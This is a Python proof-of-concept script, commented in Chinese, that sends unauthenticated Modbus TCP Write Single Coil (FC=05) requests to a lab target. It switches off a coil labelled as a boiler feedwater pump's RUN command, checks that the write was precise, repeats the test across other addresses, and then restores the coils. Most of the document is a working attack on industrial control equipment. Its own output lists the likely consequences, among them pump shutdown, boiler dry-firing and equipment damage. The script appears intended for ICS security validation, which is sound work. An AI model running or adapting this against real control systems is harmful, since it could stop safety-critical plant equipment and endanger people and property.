#!/usr/bin/env python3
"""
POC: Write Single Coil - Output Address (FC=05)

验证攻击者可通过 FC=05 精确指定 Output Address，
单条请求即可关闭安全关键线圈（如锅炉给水泵 RUN 指令）。
"""

import socket
import struct
import time

TARGET_HOST = "172.20.0.10"
TARGET_PORT = 502
TIMEOUT = 5

PUMP_COIL_ADDR = 0x0064  # coil 100 — 锅炉给水泵 RUN 指令
COIL_ON  = 0xFF00
COIL_OFF = 0x0000


def build_fc05_request(txn_id, unit_id, coil_addr, value):
    """构造 FC=05 Write Single Coil 完整 Modbus TCP ADU"""
    pdu = struct.pack('>BHH', 0x05, coil_addr, value)
    length = 1 + len(pdu)  # unit_id + PDU
    mbap = struct.pack('>HHHB', txn_id, 0x0000, length, unit_id)
    return mbap + pdu


def build_fc01_request(txn_id, unit_id, start_addr, quantity):
    """构造 FC=01 Read Coils 请求"""
    pdu = struct.pack('>BHH', 0x01, start_addr, quantity)
    length = 1 + len(pdu)
    mbap = struct.pack('>HHHB', txn_id, 0x0000, length, unit_id)
    return mbap + pdu


def send_recv(sock, data, label=""):
    hex_out = ' '.join(f'{b:02x}' for b in data)
    print(f"  [TX] {label}")
    print(f"       {hex_out}")
    sock.sendall(data)
    resp = sock.recv(1024)
    hex_in = ' '.join(f'{b:02x}' for b in resp)
    print(f"  [RX] {hex_in}")
    return resp


def parse_fc05_resp(resp):
    if len(resp) < 12:
        return None, "响应过短"
    fc = resp[7]
    if fc == 0x85:  # FC=05 error
        err = {1: "ILLEGAL_FUNCTION", 2: "ILLEGAL_DATA_ADDRESS",
               3: "ILLEGAL_DATA_VALUE", 4: "SLAVE_DEVICE_FAILURE"}
        return None, f"异常: {err.get(resp[8], f'0x{resp[8]:02X}')}"
    if fc == 0x05:
        addr = struct.unpack('>H', resp[8:10])[0]
        val = struct.unpack('>H', resp[10:12])[0]
        return {"addr": addr, "value": val}, "成功"
    return None, f"未知FC: 0x{fc:02X}"


def parse_fc01_resp(resp):
    if len(resp) < 10:
        return None, "响应过短"
    fc = resp[7]
    if fc == 0x81:
        return None, f"读取异常: 0x{resp[8]:02X}"
    if fc == 0x01:
        bc = resp[8]
        bits = []
        for i in range(bc):
            byte_val = resp[9 + i]
            for bit in range(8):
                bits.append((byte_val >> bit) & 1)
        return bits, "成功"
    return None, f"未知FC: 0x{fc:02X}"


def coil_state_str(val):
    return "ON (0xFF00)" if val else "OFF (0x0000)"


def run_poc():
    print("=" * 70)
    print("POC: Write Single Coil - Output Address 验证")
    print("=" * 70)
    print(f"目标: {TARGET_HOST}:{TARGET_PORT}")
    print(f"攻击线圈: 0x{PUMP_COIL_ADDR:04X} (decimal {PUMP_COIL_ADDR})")
    print(f"场景: 锅炉给水泵 RUN 指令 — 强制关闭")
    print()

    # =============================================================
    # 阶段 1: 初始化 — 设置目标线圈和相邻线圈为已知状态
    # =============================================================
    print("-" * 70)
    print("阶段 1: 初始化 — 设置目标线圈及周围线圈")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    # 将目标线圈设为 ON（泵运行中）
    req = build_fc05_request(0x0001, 0x01, PUMP_COIL_ADDR, COIL_ON)
    resp = send_recv(sock, req, f"FC=05 设置 coil[{PUMP_COIL_ADDR}]=ON (泵运行)")
    result, msg = parse_fc05_resp(resp)
    print(f"  -> {msg}")

    time.sleep(0.2)

    # 设置前后相邻线圈为 ON（模拟其他安全设备在运行）
    for offset, desc in [(-1, "前一个线圈"), (1, "后一个线圈")]:
        addr = PUMP_COIL_ADDR + offset
        req = build_fc05_request(0x0002, 0x01, addr, COIL_ON)
        resp = send_recv(sock, req, f"FC=05 设置 coil[{addr}]=ON ({desc})")
        time.sleep(0.1)

    time.sleep(0.3)

    # 读取当前状态
    print("\n  读取初始状态 (coil[99..104]):")
    req = build_fc01_request(0x0003, 0x01, PUMP_COIL_ADDR - 1, 6)
    resp = send_recv(sock, req, "FC=01 读取 coil[99..104]")
    bits, msg = parse_fc01_resp(resp)
    if bits:
        for i in range(min(6, len(bits))):
            addr = PUMP_COIL_ADDR - 1 + i
            state = coil_state_str(bits[i])
            marker = " <<< 目标 (给水泵 RUN)" if addr == PUMP_COIL_ADDR else ""
            print(f"    coil[{addr}] 0x{addr:04X} = {state}{marker}")

    sock.close()
    print()

    # =============================================================
    # 阶段 2: 核心攻击 — FC=05 精确关闭给水泵
    # =============================================================
    print("-" * 70)
    print("阶段 2: 核心攻击 — FC=05 Output Address=0x0064, Value=OFF")
    print("-" * 70)

    print(f"\n  攻击报文构造 (与 POC 文档完全一致):")
    print(f"    Function Code:    0x05 (Write Single Coil)")
    print(f"    Output Address:   0x{PUMP_COIL_ADDR:04X} (给水泵 RUN 指令)")
    print(f"    Output Value:     0x0000 (OFF — 停泵)")
    print(f"    MBAP unit_id:     0x01")
    print(f"    MBAP length:      0x0006")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    req = build_fc05_request(0x0004, 0x01, PUMP_COIL_ADDR, COIL_OFF)
    print("  --- 发送攻击报文 ---")
    resp = send_recv(sock, req,
        f"FC=05 Output Address=0x{PUMP_COIL_ADDR:04X}, Value=OFF")
    result, msg = parse_fc05_resp(resp)

    attack_ok = False
    if result:
        val_str = "ON" if result['value'] == COIL_ON else "OFF"
        print(f"\n  [!] 攻击成功!")
        print(f"      响应确认: 地址 0x{result['addr']:04X}, 值 0x{result['value']:04X} ({val_str})")
        attack_ok = True
    else:
        print(f"\n  [X] 攻击失败: {msg}")

    time.sleep(0.3)

    # 验证：仅目标线圈变为 OFF，相邻线圈不受影响
    print("\n  --- 验证攻击精确性 ---")
    req = build_fc01_request(0x0005, 0x01, PUMP_COIL_ADDR - 1, 6)
    resp = send_recv(sock, req, "FC=01 读取 coil[99..104]")
    bits, msg = parse_fc01_resp(resp)
    if bits:
        print(f"\n  攻击后线圈状态:")
        expected_target_off = True
        neighbors_intact = True
        for i in range(min(6, len(bits))):
            addr = PUMP_COIL_ADDR - 1 + i
            state = coil_state_str(bits[i])
            marker = ""
            if addr == PUMP_COIL_ADDR:
                if bits[i] == 0:
                    marker = " ← 已关闭! (ON→OFF, 泵已停止)"
                else:
                    marker = " ← 未变 (攻击未生效)"
                    expected_target_off = False
            elif addr in (PUMP_COIL_ADDR - 1, PUMP_COIL_ADDR + 1):
                if bits[i] == 1:
                    marker = " (未受影响 ✓)"
                else:
                    marker = " ← 意外变更!"
                    neighbors_intact = False
            check = "✓" if (addr == PUMP_COIL_ADDR and bits[i] == 0) or \
                          (addr != PUMP_COIL_ADDR and addr in (PUMP_COIL_ADDR-1, PUMP_COIL_ADDR+1) and bits[i] == 1) \
                          else " "
            print(f"    {check} coil[{addr}] 0x{addr:04X} = {state}{marker}")

        if expected_target_off and neighbors_intact:
            print(f"\n  [!] Output Address 精确定位确认:")
            print(f"      - 目标线圈 0x{PUMP_COIL_ADDR:04X}: ON → OFF (泵已停止)")
            print(f"      - 相邻线圈: 全部保持 ON (未受影响)")

    sock.close()
    print()

    # =============================================================
    # 阶段 3: 扩展验证 — 多个 Output Address 均可精确控制
    # =============================================================
    print("-" * 70)
    print("阶段 3: 扩展验证 — 不同 Output Address 均可精确操控")
    print("-" * 70)
    print()

    test_coils = [
        (0x0000, "coil[0]   — 首地址"),
        (0x0032, "coil[50]  — 中间地址"),
        (0x0064, "coil[100] — POC 目标"),
        (0x00C8, "coil[200] — 高位地址"),
        (0x01F4, "coil[500] — 远端地址"),
    ]

    results_table = []
    txn = 0x0010

    for addr, desc in test_coils:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        try:
            sock.connect((TARGET_HOST, TARGET_PORT))

            # 先设为 OFF 确保初始状态
            req = build_fc05_request(txn, 0x01, addr, COIL_OFF)
            sock.sendall(req)
            sock.recv(1024)
            time.sleep(0.1)

            # 写入 ON
            req = build_fc05_request(txn + 1, 0x01, addr, COIL_ON)
            resp = send_recv(sock, req, f"FC=05 addr=0x{addr:04X} → ON")
            w_result, w_msg = parse_fc05_resp(resp)
            time.sleep(0.2)

            # 回读
            req = build_fc01_request(txn + 2, 0x01, addr, 1)
            resp = send_recv(sock, req, f"FC=01 读取 coil[{addr}]")
            bits, r_msg = parse_fc01_resp(resp)

            write_ok = w_result is not None
            read_val = bits[0] if bits else None
            match = (read_val == 1) if read_val is not None else False
            results_table.append((addr, desc, write_ok, read_val, match))

            status = "✓" if match else "✗"
            state = "ON" if read_val else "OFF" if read_val is not None else "N/A"
            print(f"    {status} {desc}: 写入 ON, 回读 {state}")
            print()

            # 恢复
            req = build_fc05_request(txn + 3, 0x01, addr, COIL_OFF)
            sock.sendall(req)
            sock.recv(1024)

            txn += 4
        except Exception as e:
            print(f"    ✗ {desc}: 错误 {e}")
            results_table.append((addr, desc, False, None, False))
        finally:
            sock.close()
            time.sleep(0.2)

    # =============================================================
    # 阶段 4: 恢复
    # =============================================================
    print("-" * 70)
    print("阶段 4: 恢复所有线圈")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    for addr in [PUMP_COIL_ADDR - 1, PUMP_COIL_ADDR, PUMP_COIL_ADDR + 1]:
        req = build_fc05_request(0x00F0, 0x01, addr, COIL_OFF)
        sock.sendall(req)
        sock.recv(1024)
        time.sleep(0.1)

    print(f"  [OK] 所有线圈已恢复为 OFF")
    sock.close()

    # =============================================================
    # 汇总
    # =============================================================
    print()
    print("=" * 70)
    print("验证结果汇总")
    print("=" * 70)
    print()

    print(f"  {'地址':<16} {'描述':<28} {'写入':<8} {'回读':<8} {'命中':<6}")
    print(f"  {'-'*16} {'-'*28} {'-'*8} {'-'*8} {'-'*6}")

    ok_count = 0
    for addr, desc, write_ok, read_val, match in results_table:
        w = "✓" if write_ok else "✗"
        rv = "ON" if read_val else "OFF" if read_val is not None else "N/A"
        m = "✓" if match else "✗"
        print(f"  0x{addr:04X} (d={addr:<4}) {desc:<28} {w:<8} {rv:<8} {m}")
        if match:
            ok_count += 1

    print()
    print(f"  测试 {len(test_coils)} 个地址，{ok_count} 个精确命中")
    print()

    if attack_ok and ok_count == len(test_coils):
        print("  [!] 安全发现: FC=05 Write Single Coil 的 Output Address 可被")
        print("      攻击者完全控制，单条请求即可关闭任意安全关键线圈!")
        print()
        print("  [!] 攻击影响 (锅炉给水系统场景):")
        print(f"      给水泵 RUN 指令线圈 0x{PUMP_COIL_ADDR:04X}: ON → OFF")
        print("      - 给水泵停止运行")
        print("      - 锅炉水位下降")
        print("      - 可能导致过热、干烧、设备损坏")
        print()
        print("  CWE 分类:")
        print("    - CWE-306: Missing Authentication for Critical Function")
        print("    - CWE-284: Improper Access Control")
        print("    - CWE-862: Missing Authorization")

    print()
    print("=" * 70)
    print("POC 验证完成")
    print("=" * 70)


if __name__ == "__main__":
    run_poc()
